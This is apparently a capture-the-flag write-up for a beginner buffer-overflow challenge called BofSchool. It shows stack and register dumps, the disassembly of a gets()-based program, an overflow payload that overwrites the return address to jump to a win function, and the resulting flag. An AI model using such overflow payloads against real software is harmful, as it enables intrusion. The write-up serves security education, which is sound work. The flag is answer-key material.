# BofSchool

93, BINARY EXPLOITATION, 22 SOLVES

## Description
Welcome to Pwn101.

stty -icanon -echo ; nc chals.whitehacks.ctf.sg 12001; stty sane

Controls:

q           - Quit the program
[Backspace] - Delete character
[Enter]     - Send payload

Use `\xXX` to send hex encoded characters (useful for unprintable characters), e.g. "\x44\x41\x42" is equivalent to "DAB"
Author: lord_idiot


# Solution

On running the command given above, you get a UI similar to that shown below.

```
┌ Stack ─────────────────────────────────────────────┐┌ Disassembly ─────────────────────────────────────────────────┐                                                
│                                                    ││                                                              │                                                
│ 0x00007fffffffd770|+0x00: 41 41 41 41 41 41 41 41  ││ win:                                                         │                                                
│ 0x00007fffffffd778|+0x08: 42 42 42 42 42 42 42 42  ││  0x0000000000400566 <+0> :    push   rbp                     │                                                
│ 0x00007fffffffd780|+0x10: 43 43 43 43 43 43 43 43  ││  0x0000000000400567 <+1> :    mov    rbp,rsp                 │                                                
│ 0x00007fffffffd788|+0x18: 44 44 44 44 44 44 44 44  ││  0x000000000040056a <+4> :    mov    edi,0x601060 <flag>     │                                                
│ 0x00007fffffffd790|+0x20: 45 45 45 45 45 45 45 45  ││  0x000000000040056f <+9> :    call   0x400430 <puts@plt>     │                                                
│ 0x00007fffffffd798|+0x28: 46 46 46 46 46 46 46 46  ││  0x0000000000400574 <+14>:    nop                            │                                                
│ 0x00007fffffffd7a0|+0x30: 47 47 47 47 47 47 47 47  ││  0x0000000000400575 <+15>:    pop    rbp                     │                                                
│ 0x00007fffffffd7a8|+0x38: 48 48 48 48 48 48 48 48  ││  0x0000000000400576 <+16>:    ret                            │                                                
│ 0x00007fffffffd7b0|+0x40: 00 00 00 01 f7 ff cc a0  ││                                                              │                                                
│ 0x00007fffffffd7b8|+0x48: 00 00 00 00 00 40 05 77  ││ main:                                                        │                                                
│ 0x00007fffffffd7c0|+0x50: 00 00 00 00 00 00 00 00  ││  0x0000000000400577 <+0> :    push   rbp                     │                                                
│                                                    ││  0x0000000000400578 <+1> :    mov    rbp,rsp                 │                                                
└────────────────────────────────────────────────────┘│  0x000000000040057b <+4> :    sub    rsp,0x20                │                                                
┌ Registers ─────────────────────────────────────────┐│  0x000000000040057f <+8> :    lea    rax,[rbp-0x20]          │                                                
│                                                    ││  0x0000000000400583 <+12>:    mov    rdi,rax                 │                                                
│ rip:  0x000000000040058b                           ││  0x0000000000400586 <+15>:    mov    eax,0x0                 │                                                
│ rsp:  0x00007fffffffd770                           ││  0x000000000040058b <+20>:    call   0x400450 <gets@plt>     │                                                
│ rbp:  0x00007fffffffd790                           ││  0x0000000000400590 <+25>:    mov    eax,0x0                 │                                                
│ rdi:  0x00007fffffffd770                           ││  0x0000000000400595 <+30>:    leave                          │                                                
│ rax:  0x00007fffffffd770                           ││  0x0000000000400596 <+31>:    ret                            │                                                
│                                                    ││                                                              │                                                
└────────────────────────────────────────────────────┘└──────────────────────────────────────────────────────────────┘                                                
┌ Input ─────────────────────────────────────────────────────────────────────────────────────────────────────────────┐                                                
│ AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHH                                                   │                                                
└────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘                                        
                                                                                                          
```

```
┌ Stack ─────────────────────────────────────────────┐┌ Disassembly ─────────────────────────────────────────────────┐                                                
│                                                    ││                                                              │                                                
│ 0x00007fffffffd770|+0x00: 41 41 41 41 41 41 41 41  ││ win:                                                         │                                                
│ 0x00007fffffffd778|+0x08: 42 42 42 42 42 42 42 42  ││  0x0000000000400566 <+0> :    push   rbp                     │                                                
│ 0x00007fffffffd780|+0x10: 43 43 43 43 43 43 43 43  ││  0x0000000000400567 <+1> :    mov    rbp,rsp                 │                                                
│ 0x00007fffffffd788|+0x18: 44 44 44 44 44 44 44 44  ││  0x000000000040056a <+4> :    mov    edi,0x601060 <flag>     │                                                
│ 0x00007fffffffd790|+0x20: 45 45 45 45 45 45 45 45  ││  0x000000000040056f <+9> :    call   0x400430 <puts@plt>     │                                                
│ 0x00007fffffffd798|+0x28:┌ Result ────────────────────────────────────────┐+14>:    nop                            │                                                
│ 0x00007fffffffd7a0|+0x30:│                                                │+15>:    pop    rbp                     │                                                
│ 0x00007fffffffd7a8|+0x38:│ Segmentation fault (core dumped)               │+16>:    ret                            │                                                
│ 0x00007fffffffd7b0|+0x40:│ rip:  0x4646464646464646                       │                                        │                                                
│ 0x00007fffffffd7b8|+0x48:└────────────────────────────────────────────────┘                                        │                                                
│ 0x00007fffffffd7c0|+0x50: 00 00 00 00 00 00 00 00  ││  0x0000000000400577 <+0> :    push   rbp                     │                                                
│                                                    ││  0x0000000000400578 <+1> :    mov    rbp,rsp                 │                                                
└────────────────────────────────────────────────────┘│  0x000000000040057b <+4> :    sub    rsp,0x20                │                                                
┌ Registers ─────────────────────────────────────────┐│  0x000000000040057f <+8> :    lea    rax,[rbp-0x20]          │                                                
│                                                    ││  0x0000000000400583 <+12>:    mov    rdi,rax                 │                                                
│ rip:  0x4646464646464646                           ││  0x0000000000400586 <+15>:    mov    eax,0x0                 │                                                
│ rsp:  0x00007fffffffd798                           ││  0x000000000040058b <+20>:    call   0x400450 <gets@plt>     │                                                
│ rbp:  0x4545454545454545                           ││  0x0000000000400590 <+25>:    mov    eax,0x0                 │                                                
│ rdi:  0x00007fffffffd770                           ││  0x0000000000400595 <+30>:    leave                          │                                                
│ rax:  0x0000000000000000                           ││  0x0000000000400596 <+31>:    ret                            │                                                
│                                                    ││                                                              │                                                
└────────────────────────────────────────────────────┘└──────────────────────────────────────────────────────────────┘                                                
┌ Input ─────────────────────────────────────────────────────────────────────────────────────────────────────────────┐                                                
│ AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHH                                                   │                                                
└────────────────────────────────────────────────────────────────────────────
```

This ends up being a simple Buffer overflow challenge, made even easier by the UI. Just write a sufficient amount of bytes to reach the RIP, and overwrite the RIP to the memory address `0x0000000000400566`

Payload: `AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEE\x66\x05\x40\x00\x00\x00\x00\x00`


```
┌ Stack ─────────────────────────────────────────────┐┌ Disassembly ─────────────────────────────────────────────────┐                                                
│                                                    ││                                                              │                                                
│ 0x00007fffffffd770|+0x00: 41 41 41 41 41 41 41 41  ││ win:                                                         │                                                
│ 0x00007fffffffd778|+0x08: 42 42 42 42 42 42 42 42  ││  0x0000000000400566 <+0> :    push   rbp                     │                                                
│ 0x00007fffffffd780|+0x10: 43 43 43 43 43 43 43 43  ││  0x0000000000400567 <+1> :    mov    rbp,rsp                 │                                                
│ 0x00007fffffffd788|+0x18: 44 44 44 44 44 44 44 44  ││  0x000000000040056a <+4> :    mov    edi,0x601060 <flag>     │                                                
│ 0x00007fffffffd790|+0x20: 45 45 45 45 45 45 45 45  ││  0x000000000040056f <+9> :    call   0x400430 <puts@plt>     │                                                
│ 0x00007fffffffd798|+0x28:┌ Result ────────────────────────────────────────┐+14>:    nop                            │                                                
│ 0x00007fffffffd7a0|+0x30:│                                                │+15>:    pop    rbp                     │                                                
│ 0x00007fffffffd7a8|+0x38:│ Congrats! You got the flag :D                  │+16>:    ret                            │                                                
│ 0x00007fffffffd7b0|+0x40:│   WH2020{A_for_pwning!}                        │                                        │                                                
│ 0x00007fffffffd7b8|+0x48:└────────────────────────────────────────────────┘                                        │                                                
│ 0x00007fffffffd7c0|+0x50: 00 00 00 00 00 00 00 00  ││  0x0000000000400577 <+0> :    push   rbp                     │                                                
│                                                    ││  0x0000000000400578 <+1> :    mov    rbp,rsp                 │                                                
└────────────────────────────────────────────────────┘│  0x000000000040057b <+4> :    sub    rsp,0x20                │                                                
┌ Registers ─────────────────────────────────────────┐│  0x000000000040057f <+8> :    lea    rax,[rbp-0x20]          │                                                
│                                                    ││  0x0000000000400583 <+12>:    mov    rdi,rax                 │                                                
│ rip:  0x0000000000400566                           ││  0x0000000000400586 <+15>:    mov    eax,0x0                 │                                                
│ rsp:  0x00007fffffffd798                           ││  0x000000000040058b <+20>:    call   0x400450 <gets@plt>     │                                                
│ rbp:  0x00007fffffffd798                           ││  0x0000000000400590 <+25>:    mov    eax,0x0                 │                                                
│ rdi:  0x0000000000601060                           ││  0x0000000000400595 <+30>:    leave                          │                                                
│ rax:  0x0000000000000000                           ││  0x0000000000400596 <+31>:    ret                            │                                                
│                                                    ││                                                              │                                                
└────────────────────────────────────────────────────┘└──────────────────────────────────────────────────────────────┘                                                
┌ Input ─────────────────────────────────────────────────────────────────────────────────────────────────────────────┐                                                
│ AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEE\x66\x05\x40\x00\x00\x00\x00\x00                                           │                                                
└────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘                                                                           
```

Overall a nice challenge for beginners.

# Flag
`WH2020{A_for_pwning!}`